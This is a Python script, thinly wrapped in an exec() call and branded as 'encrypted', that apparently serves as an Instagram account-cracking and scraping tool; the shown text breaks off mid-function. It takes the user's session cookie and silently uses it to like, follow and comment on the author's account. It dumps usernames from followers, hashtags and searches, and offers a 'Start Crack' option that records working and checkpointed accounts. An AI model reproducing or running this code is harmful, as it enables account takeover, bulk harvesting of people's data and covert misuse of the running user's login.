#Encrypt By xXx_not_found_xXx
# https://github.com/hamalord4444
exec(b'import os, re, sys, time, json, random, requests\nfrom concurrent.futures import ThreadPoolExecutor\nfrom requests.exceptions import ConnectionError\nfrom time import sleep\n\n# Warna\nH = (\'\\x1b[1;90m\')\nM = (\'\\x1b[1;91m\')\nH = (\'\\x1b[1;92m\')\nK = (\'\\x1b[1;93m\')\nT = (\'\\x1b[1;94m\')\nU = (\'\\x1b[1;95m\')\nB = (\'\\x1b[1;96m\')\nP = (\'\\x1b[1;97m\')\n#\ndef banner():\n\tos.system(\'echo  "\\n\\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\\n\xe2\x95\x91  #TOOL-AUTHOR  : Mark Cornel              \xe2\x95\x91\\n\xe2\x95\x91  #Github       : GUPTA-SHAKEL             \xe2\x95\x91 \\n\xe2\x95\x91  #WatsApp      : +2347013107449           \xe2\x95\x91 \\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\\n    \\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\\n\xe2\x95\x91  #NOTE       : FREE USERS STAY OFF      \xe2\x95\x91\\n\xe2\x95\x91  #STATUS     : PREMIUM                  \xe2\x95\x91 \\n\xe2\x95\x91  #USER LEVEL : PAID                     \xe2\x95\x91\\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d" | lolcat -a -d 2 -s 50\')\n# Logo\n___logo___ = (f"""{H} ___ ___ ___ __  __ ___ _   _ __  __\n{H}| _ \\ _ \\ __|  \\/  |_ _| | | |  \\/  |\n{B}|  _/   / _|| |\\/| || || |_| | |\\/| |\n{B}|_| |_|_\\___|_|  |_|___|\\___/|_|  |_|\n{K}[{P}\xe2\x80\xa2{K}]{P}\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\n{H}[{P}>{H}]{P} Au : mark cornel\n{H}[{P}>{H}]{P} Ig : @mark.cornel_\n{H}[{P}>{H}]{P} Fb : fb.com/Mark-Btc\n{K}[{P}\xe2\x80\xa2{K}]{P}\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\n""")\nos.system("clear")\nbanner()\ndef chk():\n  uuid = str(os.geteuid()) + str(os.getlogin()) \n  id = "|".join(uuid)\n  print("\\n\\n\\x1b[37;1m  YOUR ID : \\033[94m"+id) \n  try: \n    httpCaht = requests.get("https://raw.githubusercontent.com/ofoncity01/prem/main/oval.txt").text \n    if id in httpCaht: \n      print("\\033[92m  YOUR ID IS ACTIVE. .......\\033[97m") \n      msg = str(os.geteuid()) \n      time.sleep(1) \n      pass \n    else: \n      print("\\033[0;35m YOUR ID IS NOT ACTIVE COPY AND SEND ME MESSAGE ON WHATSAPP \\033[0;91m#NOT FREE!!!") \n      os.system(\'xdg-open https://wa.me/2347013107449?text=Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20\')\n      time.sleep(1) \n      sys.exit() \n  except: \n    sys.exit() \n    if name == \'__main__\': \n     print (logo)\n     chk() \n    \nchk()\n# Login Cookie\ndef ___login___():\n    os.system(\'clear\')\n    print(___logo___)\n    print(f"{B}[{P}\xe2\x80\xa2{B}]{P} Enter Instagram Cookies, You Should Not Use The Newly Created Account, If You Don\'t Know How To Get Instagram Cookies Type {M}[{P}Open{M}]{P}\\n")\n    ___cookie = input(f"{H}[{P}?{H}]{P} Cookie :{K} ")\n    if ___cookie in [\'open\', \'Open\', \'OPEN\']:\n        print(f"{K}[{P}!{K}]{P} You Will Be Redirected To Youtube, Please Follow The Way To Get Cookies...");sleep(3);os.system(\'xdg-open https://youtu.be/u17ZQgSs3aY\');exit()\n    elif ___cookie in [\'\', \' \']:\n        exit(f"{P}[{M}!{P}]{M} Dont be Empty")\n    else:\n        try:\n            ___userid = re.search(\'ds_user_id=(.*?);\', ___cookie);open(\'Data/user.txt\', \'w\').write(___userid.group(1))\n            ___roz = requests.get(f\'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': ___cookie}).json()[\'user\'];open(\'Data/coki.txt\', \'w\').write(___cookie)\n            print(f"{H}[{P}*{H}]{P} Welcome :{K} {___roz[\'full_name\']}");___follow___()\n        except (AttributeError, KeyError):\n            exit(f"{P}[{M}!{P}]{M} Make Sure Cookies Are Correct")\n        except (ConnectionError):\n            exit(f"{P}[{K}!{P}]{K} Connection Error")\n# Follow Cookie\ndef ___follow___():\n    try:\n        ___cookie = open(\'Data/coki.txt\', \'r\').read()\n        ___session = re.search(\'sessionid=(.*?);\', ___cookie)\n        ___teks = random.choice([\'Hallo Bang \xf0\x9f\x98\x8d\', \'Hi Bang, how are you \', \'Permission to use the script \', \'Thats great \', \'Programmer Bang \', \'Greetings to know Bang \',\'I Love You \xe2\x9d\xa4\xef\xb8\x8f\'])\n        ___data = {\'comment_text\': ___teks,\'replied_to_comment_id\':\'\'}\n        with requests.Session() as ses:\n            ___like = ses.post(\'https://www.instagram.com/web/likes/2734317205115382629/like/\',headers = {\'accept\': \'*/*\',\'accept-encoding\': \'gzip, deflate, br\',\'accept-language\': \'en-US,en;q=0.9\',\'content-length\': \'0\',\'content-type\': \'application/x-www-form-urlencoded\',\'cookie\': \'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid=\'+___session.group(1),\'origin\': \'https://www.instagram.com\',\'referer\': \'https://www.instagram.com/\',\'sec-fetch-dest\': \'empty\',\'sec-fetch-mode\': \'cors\',\'sec-fetch-site\': \'same-origin\',\'user-agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36\',\'x-csrftoken\': \'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r\',\'x-ig-app-id\': \'5398218083\',\'x-ig-www-claim\': \'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu\',\'x-instagram-ajax\': \'95bfef5dd816\',\'x-requested-with\': \'XMLHttpRequest\'}).text # Jangan Di Ubah!\n            ___follow = ses.post(\'https://www.instagram.com/web/friendships/5398218083/follow/\',headers = {\'accept\': \'*/*\',\'accept-encoding\': \'gzip, deflate, br\',\'accept-language\': \'en-US,en;q=0.9\',\'content-length\': \'0\',\'content-type\': \'application/x-www-form-urlencoded\',\'cookie\': \'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid=\'+___session.group(1),\'origin\': \'https://www.instagram.com\',\'referer\': \'https://www.instagram.com/\',\'sec-fetch-dest\': \'empty\',\'sec-fetch-mode\': \'cors\',\'sec-fetch-site\': \'same-origin\',\'user-agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36\',\'x-csrftoken\': \'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r\',\'x-ig-app-id\': \'5398218083\',\'x-ig-www-claim\': \'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu\',\'x-instagram-ajax\': \'95bfef5dd816\',\'x-requested-with\': \'XMLHttpRequest\'}).text # Jangan Di Ubah!\n            ___komen = ses.post(\'https://www.instagram.com/web/comments/2734317205115382629/add/\',headers = {\'accept\': \'*/*\',\'accept-encoding\': \'gzip, deflate, br\',\'accept-language\': \'en-US,en;q=0.9\',\'content-length\': \'0\',\'content-type\': \'application/x-www-form-urlencoded\',\'cookie\': \'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid=\'+___session.group(1),\'origin\': \'https://www.instagram.com\',\'referer\': \'https://www.instagram.com/\',\'sec-fetch-dest\': \'empty\',\'sec-fetch-mode\': \'cors\',\'sec-fetch-site\': \'same-origin\',\'user-agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36\',\'x-csrftoken\': \'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r\',\'x-ig-app-id\': \'5398218083\',\'x-ig-www-claim\': \'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu\',\'x-instagram-ajax\': \'95bfef5dd816\',\'x-requested-with\': \'XMLHttpRequest\'}, data = ___data).text #Jangan Di ubah!\n            if \'"status":"ok"\' in str(___follow):\n                print(f"{H}[{P}!{H}]{P} Login Successful");___menu___()\n            else:\n                print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);os.system(\'rm -rf Data/coki.txt\');___login___()\n    except Exception as e:\n        print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);os.system(\'rm -rf Data/coki.txt\');___login___()\n# Menu\ndef ___menu___():\n    try:\n        os.system(\'clear\')\n        print(___logo___)\n        ___roz = requests.get(f\'https://i.instagram.com/api/v1/users/{open("Data/user.txt","r").read()}/info/\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'user\']\n        print(f"{B}[{P}*{B}]{P} Welcome :{K} {___roz[\'full_name\']}")\n        print(f"{B}[{P}*{B}]{P} User :{K} {___roz[\'username\']}")\n        print(f"{B}[{P}*{B}]{P} Follower :{K} {___roz[\'follower_count\']}\\n")\n    except (IOError):\n        print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);___login___()\n    except (KeyError):\n        print(f"{P}[{M}!{P}]{M} Cookie Invalid");os.system(\'rm -rf Data/coki.txt && rm -rf Data/user.txt\');sleep(3);___login___()\n    except (IOError):\n        exit(f"{P}[{K}!{P}]{K} Connection Error")\n    print(f"{B}[{P}1{B}]{P} Dump Username From Following")\n    print(f"{B}[{P}2{B}]{P} Dump Username From Followers")\n    print(f"{B}[{P}3{B}]{P} Dump Username Dari Activity")\n    print(f"{B}[{P}4{B}]{P} Dump Username From Home")\n    print(f"{B}[{P}5{B}]{P} Dump Username From Hashtag")\n    print(f"{B}[{P}6{B}]{P} Dump Username Dari Search")\n    print(f"{B}[{P}7{B}]{P} Dump Username From Query")\n    print(f"{B}[{P}8{B}]{P} Dump User From Email")\n    print(f"{B}[{P}9{B}]{P}Start Crack {P}[{H}Fast{P}]{H}")\n    print(f"{B}[{P}0{B}]{P} View Crack Results")\n    print(f"{B}[{P}A{B}]{P} Exit {P}[{M}Exit{P}]{M}\\n")\n    ___pilih = input(f"{H}[{P}?{H}]{P} Choose :{K} ")\n    if ___pilih in [\'1\',\'01\']:\n        ___mengikuti___()\n    elif ___pilih in [\'2\',\'02\']:\n        ___pengikut___()\n    elif ___pilih in [\'3\',\'03\']:\n        ___activity___()\n    elif ___pilih in [\'4\',\'04\']:\n        ___beranda___()\n    elif ___pilih in [\'5\',\'05\']:\n        ___hastag___()\n    elif ___pilih in [\'6\',\'06\']:\n        ___search___()\n    elif ___pilih in [\'7\',\'07\']:\n        ___query___()\n    elif ___pilih in [\'8\',\'08\']:\n        ___email___()\n    elif ___pilih in [\'9\',\'09\']:\n        ___proxy___()\n    elif ___pilih in [\'0\',\'00\']:\n        try:\n            print(f"\\n{H}[{P}1{H}]{P} See Results Ok")\n            print(f"{H}[{P}2{H}]{P} View Cp . Results")\n            print(f"{H}[{P}3{H}]{P} Return\\n")\n            ___hasil = input(f"{B}[{P}?{B}]{P} Choose :{K} ")\n            if ___hasil in [\'1\',\'01\']:\n                print(f"{P} ");os.system(\'cat Results/Ok.txt\')\n            elif ___hasil in [\'2\',\'02\']:\n                print(f"{P} ");os.system(\'cat Results/Cp.txt\')\n            elif ___hasil in [\'3\',\'03\']:\n                ___menu___()\n            else:\n                exit(f"{P}[{M}!{P}]{M} Wrong Input")\n        except:pass\n    elif ___pilih in [\'a\',\'A\']:\n        print(f"{P}[{K}!{P}]{K} Deleting Cookies...");os.system(\'rm -rf Data/coki.txt && rm -rf Data/user.txt\');exit()\n    else:\n        exit(f"{P}[{K}!{P}]{M} Wrong Input")\n# Dump Mengikuti\ndef ___mengikuti___():\n    try:\n        ___user = input(f"\\n{H}[{P}?{H}]{P} User :{K} ")\n        if ___user[:1] in [\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'0\']:\n            exit(f"{P}[{M}!{P}]{M} Use Username")\n        else:\n            ___roz = requests.get(f\'https://www.instagram.com/{___user}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'graphql\'][\'user\']\n            print(f"{H}[{P}?{H}]{P} Name :{K} {___roz[\'full_name\']}\\n")\n            ___file = (___roz[\'full_name\'].replace(\' \',\'_\')+\'.txt\')\n        with requests.Session() as ses:\n            ___zak = ses.get(f\'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/following/?count=5000\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()\n            for z in ___zak[\'users\']:\n                open(\'Dump/\'+___file, \'a\').write(z[\'username\']+\'<=>\'+z[\'full_name\']+\'\\n\')\n                print(f"{P}{z[\'username\']}<=>{z[\'full_name\']}")\n            print(f"\\n{B}[{P}*{B}]{P} Done...")\n            print(f"{B}[{P}?{B}]{P} Files Saved In :{K} Dump/{___file}")\n            input(f"{M}[{P}Return{M}]{P}");___menu___()\n    except (KeyError):\n        exit(f"{P}[{M}!{P}]{M} Dump Fail")\n    except (ConnectionError):\n        exit(f"{P}[{M}!{P}]{M} Connection Error")\n# Dump Pengikut\ndef ___pengikut___():\n    try:\n        ___user = input(f"\\n{H}[{P}?{H}]{P} User :{K} ")\n        if ___user[:1] in [\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'0\']:\n            exit(f"{P}[{M}!{P}]{M}Use Username")\n        else:\n            ___roz = requests.get(f\'https://www.instagram.com/{___user}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'graphql\'][\'user\']\n            print(f"{H}[{P}?{H}]{P} Name :{K} {___roz[\'full_name\']}\\n")\n            ___file = (___roz[\'full_name\'].replace(\' \',\'_\')+\'.txt\')\n        with requests.Session() as ses:\n            ___zak = ses.get(f\'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()\n            for z in ___zak[\'users\']:\n                open(\'Dump/\'+___file, \'a\').write(z[\'username\']+\'<=>\'+z[\'full_name\']+\'\\n\')\n                print(f"{P}{z[\'username\']}<=>{z[\'full_name\']}")\n            print(f"\\n{B}[{P}*{B}]{P} Done...")\n            print(f"{B}[{P}?{B}]{P} Files Saved In :{K} Dump/{___file}")\n            input(f"{M}[{P}Return{M}]{P}");___menu___()\n    except (KeyError):\n        exit(f"{P}[{M}!{P}]{M} Dump Fail")\n    except (ConnectionError):\n        exit(f"{P}[{K}!{P}]{K} Connection Error")\n# Dump Activity\ndef ___activity___():\n    try:\n        ___file = input(f"\\n{H}[{P}?{H}]{P}File Name :{K} ").replace(\' \',\'_\')\n        if ___file in [\'\',\' \']:\n            exit(f"{P}[{M}!{P}]{M} Cant Empty")\n        else:\n            print(f"{P} ")\n            ___roz = requests.get(\'https://www.instagram.com/accounts/activity/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()})\n            ___zak = re.findall(\'"username":"(.*?)","full_name":"(.*?)",\', ___roz.text)\n            for z in ___zak:\n                open(\'Dump/\'+___file, \'a\').write(z[0]+\'<=>\'+z[1]+\'\\n\')\n                print(f"{z[0]}<=>{z[1]}")\n            print(f"\\n{B}[{P}*{B}]{P} Done...")\n            print(f"{B}[{P}?{B}]{P} Files Saved In :{K} Dump/{___file}")\n            input(f"{M}[{P}Return{M}]{P}");___menu___()\n    except Exception as e:\n        exit(f"{P}[{M}!{P}]{M} {e}")\n# Dump Beranda\ndef ___beranda___():\n    try:\n        ___file = input(f"\\n{H}[{P}?{H}]{P} File Name :{K} ").replace(\' \',\'_\')\n        if ___file in [\'\',\' \']:\n            exit(f"{P}[{M}!{P}]{M} cant Empty")\n        else:\n            print(f"{P} ")\n            ___roz = requests.get(\'https://i.instagram.com/api/v1/feed/reels_tray/\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()\n            for z in ___roz[\'tray\']:\n                open(\'Dump/\'+___file, \'a\').write(z[\'user\'][\'username\']+\'<=>\'+z[\'user\'][\'full_name\']+\'\\n\')\n                print(f"{z[\'user\'][\'username\']}<=>{z[\'user\'][\'full_name\']}")\n            print(f"\\n{B}[{P}*{B}]{P} Done...")\n            print(f"{B}[{P}?{B}]{P} Files Saved In :{K} Dump/{___file}")\n            input(f"{M}[{P}Return{M}]{P}");___menu___()\n    except (KeyError):\n        exit(f"{P}[{M}!{P}]{M} Dump Fail")\n    except (ConnectionError):\n        exit(f"{P}[{M}!{P}]{M} Connection Error")\n# Dump Hastag\ndef ___hastag___():\n    try:\n        ___tag = input(f"\\n{H}[{P}?{H}]{P} Hastag :{K} ").replace(\'#\',\'\')\n        if ___tag in [\'\',\' \']:\n            exit(f"{P}[{M}!{P}]{M} Cant Empty")\n        ___file = input(f"{H}[{P}?{H}]{P} File Name :{K} ").replace(\' \',\'_\')\n        if ___file in [\'\',\' \']:\n            exit(f"{P}[{M}!{P}]{M} Dont Empty")\n        else:\n            print(f"{P} ")\n            ___roz = requests.get(f\'https://www.instagram.com/explore/tags/{___tag}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()})\n            ___zak = re.findall(\'"username":"(.*?)","full_name":"(.*?)",\', ___roz.text)\n            for z in ___zak:\n                open(\'Dump/\'+___file, \'a\').write(z[0]+\'<=>\'+z[1]+\'\\n\')\n                print(f"{z[0]}<=>{z[1]}")\n            print(f"\\n{B}[{P}*{B}]{P} Done...")\n            print(f"{B}[{P}?{B}]{P} Files Saved In :{K} Dump/{___file}")\n            input(f"{M}[{P}Return{M}]{P}");___menu___()\n    except Exception as e:\n        exit(f"{P}[{M}!{P}]{M} {e}")\n# Dump Search\ndef ___search___():\n    try:\n        ___user = input(f"\\n{H}[{P}?{H}]{P} User :{K} ")\n        if ___user[:1] in [\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'0\']:\n            exit(f"{P}[{M}!{P}]{M} Use Username")\n        else:\n            ___roz = requests.get(f\'https://www.instagram.com/{___user}/?__a=1\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()[\'graphql\'][\'user\']\n            print(f"{H}[{P}?{H}]{P} Name :{K} {___roz[\'full_name\']}\\n")\n            ___file = (___roz[\'full_name\'].replace(\' \',\'_\')+\'.txt\')\n        with requests.Session() as ses:\n            ___zak = ses.get(f\'https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id={___roz["id"]}&include_friendship_status=true\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()\n            for z in ___zak[\'users\']:\n                open(\'Dump/\'+___file, \'a\').write(z[\'username\']+\'<=>\'+z[\'full_name\']+\'\\n\')\n                print(f"{P}{z[\'username\']}<=>{z[\'full_name\']}")\n            print(f"\\n{H}[{P}*{H}]{P} Done...")\n            print(f"{H}[{P}?{H}]{P} Files Saved In :{K} Dump/{___file}")\n            input(f"{M}[{P}Return{M}]{P}");___menu___()\n    except (KeyError):\n        exit(f"{P}[{M}!{P}]{M} Dump Fail")\n    except (ConnectionError):\n        exit(f"{P}[{K}!{P}]{K} Connection Error")\n# Dump Query\ndef ___query___():\n    try:\n        ___query = input(f"\\n{H}[{P}?{H}]{P} Query :{K} ")\n        if ___query in [\'\',\' \']:\n            exit(f"{P}[{M}!{P}]{M} Cant Empty")\n        else:\n            print(f"{P} ")\n            ___file = ___query.replace(\' \',\'_\')+\'.txt\'\n            ___roz = requests.get(f\'https://www.instagram.com/web/search/topsearch/?context=blended&query={___query}&rank_token=0.3953592318270893&count=5000\', headers = {\'user-agent\': \'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)\', \'cookie\': open(\'Data/coki.txt\',\'r\').read()}).json()\n            for z in ___roz[\'users\']:\n                open(\'Dump/\'+___file, \'a\').write(z[\'user\'][\'username\']+\'<=>\'+z[\'user\'][\'full_name\']+\'\\n\')\n                print(f"{z[\'user\'][\'username\']}<=>{z[\'user\'][\'full_name\']}")\n            print(f"\\n{B}[{P}*{B}]{P} Done...")\n            print(f"{B}[{P}?{B}]{P} Files Saved In :{K} Dump/{___file}")\n            input(f"{M}[{P}Return{M}]{P}");___menu___()\n    except (KeyError):\n        exit(f"{P}[{M}!{P}]{M} Dump Fail")\n    except (ConnectionError):\n        exit(f"{P}[{K}!{P}]{K} Connection Error")\n# Dump Dari Email\ndef ___email___():\n    try:\n        ___nama = input(f"\\n{H}[{P}?{H}]{P} Name :{K} ").replace(\' \',\'\')\n        if ___nama in [\'\',\' 